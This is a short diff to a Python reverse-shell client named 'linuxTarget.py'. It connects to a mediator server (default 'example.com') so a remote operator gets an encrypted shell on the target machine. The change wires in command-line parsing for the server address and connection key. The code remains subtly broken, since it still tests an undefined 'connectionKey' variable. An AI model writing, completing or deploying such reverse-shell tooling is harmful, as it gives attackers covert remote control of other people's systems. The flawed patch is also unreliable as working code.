@@ -4,6 +4,7 @@ Program: linuxTarget.py
 Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell operator client connection
 """
 
+import argparse
 from Crypto.Cipher import AES
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
@@ -84,9 +85,10 @@ if __name__ == "__main__":
     parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
     parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                             default="example.com")
+    args = parser.parse_args()
     if connectionKey:
-        rShell = LinuxRShell(mediatorhost=serverAddr, connectionKey=connectionKey)
+        rShell = LinuxRShell(mediatorhost=args.serverAddr, connectionKey=args.connectionKey)
     else:
-        rShell = LinuxRShell(mediatorhost=serverAddr)
+        rShell = LinuxRShell(mediatorhost=args.serverAddr)
     rShell.run()
 
